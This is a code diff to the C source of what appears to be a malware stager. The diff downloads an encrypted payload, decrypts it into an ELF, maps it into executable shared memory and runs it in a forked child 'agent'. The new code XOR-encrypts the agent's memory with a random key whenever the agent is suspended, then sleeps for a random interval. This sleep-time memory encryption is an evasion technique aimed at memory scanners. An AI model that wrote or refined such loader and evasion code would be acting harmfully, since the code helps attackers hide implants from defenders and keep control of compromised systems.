@@ -114,94 +114,108 @@ void stager_main(long *sp) {
   DEBUG_PRINT("Downloaded %d bytes\n", (int)downloaded_size);
 
   if (downloaded_size > 0) {
-    int is_rotated = 0;
-    uint8_t rotator_key[16] = {0};
+    // 1. Decrypt/Decompress the payload to get the ELF
+    char *final_payload = NULL;
+    size_t final_size = 0;
+    
+    // We only do this once now. We don't rotate the AES key anymore, we rotate via shared memory XOR.
+    if (build_payload_from_encrypted(payload, downloaded_size, key,
+                                     &final_payload, &final_size) != 0) {
+         DEBUG_PRINT("Failed to build payload\n");
+         exit(1);
+    }
+    DEBUG_PRINT("Payload built successfully, size: %d\n", (int)final_size);
 
-    while (1) {
-      // 1. Unlock if rotated
-      if (is_rotated) {
-        DEBUG_PRINT("Unlocking payload...\n");
-        xor_payload(payload, downloaded_size, rotator_key, 16);
-        is_rotated = 0;
-      }
+    // 2. Get ELF executable bounds
+    size_t min_vaddr = 0, max_vaddr = 0;
+    if (elf_get_memory_bounds(final_payload, &min_vaddr, &max_vaddr) != 0) {
+      DEBUG_PRINT("Failed to get ELF memory bounds\n");
+      exit(1);
+    }
+    size_t map_len = max_vaddr - min_vaddr;
+    DEBUG_PRINT("Mapping shared memory: 0x%lx - 0x%lx (%d bytes)\n", min_vaddr, max_vaddr, (int)map_len);
 
-      g_trap_requested = 0;
+    // 3. Create shared memory mapping for the child process
+    void *shared_mem = mmap((void *)min_vaddr, map_len,
+                            PROT_READ | PROT_WRITE | PROT_EXEC,
+                            MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
+    if (shared_mem == MAP_FAILED) {
+        DEBUG_PRINT("Failed to map shared memory at 0x%lx\n", min_vaddr);
+        exit(1);
+    }
 
-      char *final_payload = NULL;
-      size_t final_size = 0;
-      if (build_payload_from_encrypted(payload, downloaded_size, key,
-                                       &final_payload, &final_size) == 0) {
-        DEBUG_PRINT("Payload built successfully, size: %d\n", (int)final_size);
-        // Run it
-        long pid = fork();
-        if (pid == 0) {
-          // Child process
-          elf_run(final_payload, argv, envp);
-          exit(0);
-        } else if (pid > 0) {
-          // Parent process
-          // Free the decrypted payload to hide it from memory
-          free(final_payload);
+    // 4. Fork and Run (No environment variable injection)
+    DEBUG_PRINT("Forking child process...\n");
+    long pid = fork();
+    if (pid == 0) {
+      // Child process
+      // Load and run the ELF in the pre-mapped shared memory
+      elf_run(final_payload, argv, envp, 1);
+      exit(0);
+    } else if (pid > 0) {
+      // Parent process
+      // Free the decrypted payload to clean up
+      free(final_payload);
 
-          // Restore payload to AES-Encrypted state
-          // build_payload_from_encrypted decrypts in-place (AES-CTR).
-          // To restore it, we just run the same decryption again (symmetric).
-          // IV is at payload[0..15]
-          if (downloaded_size > 16) {
-             decrypt_data(payload + 16, downloaded_size - 16, key, (const uint8_t*)payload);
-          }
-
-          // Wait for child to exit
-          int status = 0;
-          while (1) {
-            long res = waitpid((int)pid, &status, WNOHANG);
-            if (res == pid) {
-              DEBUG_PRINT("Child exited with status %d\n", status);
-              break;
+      // Wait loop
+      uint8_t rotator_key[16] = {0};
+      int status = 0;
+      
+      while (1) {
+        long res = waitpid((int)pid, &status, WUNTRACED);
+        
+        if (res == pid) {
+            if (WIFEXITED(status) || WIFSIGNALED(status)) {
+                DEBUG_PRINT("Child exited with status %d\n", status);
+                break; // Exit stager if child dies
             }
 
-            if (g_trap_requested) {
-              DEBUG_PRINT("Indicator offline trap received, killing child %d\n",
-                          (int)pid);
-              kill((int)pid, SIGKILL);
-              waitpid((int)pid, &status, 0);
-              break;
+            if (WIFSTOPPED(status)) {
+                int sig = WSTOPSIG(status);
+                DEBUG_PRINT("Child stopped by signal %d\n", sig);
+                
+                if (sig == SIGSTOP) {
+                    DEBUG_PRINT("Agent suspended. Encrypting memory...\n");
+                    
+                    // Generate new key
+                    getrandom(rotator_key, 16, 0);
+                    
+                    // Encrypt the shared memory (in-place)
+                    xor_payload((char *)shared_mem, map_len, rotator_key, 16);
+                    
+                    // Sleep time (3-8 minutes)
+                    unsigned int sleep_s = 0;
+                    getrandom(&sleep_s, sizeof(sleep_s), 0);
+                    sleep_s = 180 + (sleep_s % 300);
+                    DEBUG_PRINT("Sleeping %d seconds...\n", sleep_s);
+                    
+                    struct timespec req;
+                    req.tv_sec = sleep_s;
+                    req.tv_nsec = 0;
+                    nanosleep(&req, NULL);
+                    
+                    DEBUG_PRINT("Waking up. Decrypting memory...\n");
+                    xor_payload((char *)shared_mem, map_len, rotator_key, 16);
+                    
+                    DEBUG_PRINT("Resuming child...\n");
+                    kill((int)pid, SIGCONT);
+                } else {
+                     kill((int)pid, SIGCONT);
+                }
             }
-
-            struct timespec req;
-            req.tv_sec = 1;
-            req.tv_nsec = 0;
-            nanosleep(&req, NULL);
-          }
-          
-          // Generate new rotation key
-          DEBUG_PRINT("Generating new rotation key...\n");
-          getrandom(rotator_key, 16, 0);
-          
-          // Apply rotation
-          DEBUG_PRINT("Rotating payload...\n");
-          xor_payload(payload, downloaded_size, rotator_key, 16);
-          is_rotated = 1;
-
-          // Sleep for a random time (3-8 minutes)
-          unsigned int sleep_s = 0;
-          getrandom(&sleep_s, sizeof(sleep_s), 0);
-          sleep_s = 180 + (sleep_s % 300);
-
-          DEBUG_PRINT("Sleeping %d seconds before restart\n", sleep_s);
-          struct timespec req;
-          req.tv_sec = sleep_s;
-          req.tv_nsec = 0;
-          nanosleep(&req, NULL);
-        } else {
-          DEBUG_PRINT("Fork failed\n");
-          free(final_payload);
-          break;
         }
-      } else {
-        DEBUG_PRINT("Failed to build payload\n");
-        break;
+        
+        // Check for our own termination?
+        if (g_trap_requested) {
+             DEBUG_PRINT("Indicator offline trap received, killing child %d\n", (int)pid);
+             kill((int)pid, SIGKILL);
+             waitpid((int)pid, &status, 0);
+             break;
+        }
       }
+    } else {
+      DEBUG_PRINT("Fork failed\n");
+      exit(1);
     }
   } else {
     DEBUG_PRINT("Download failed\n");
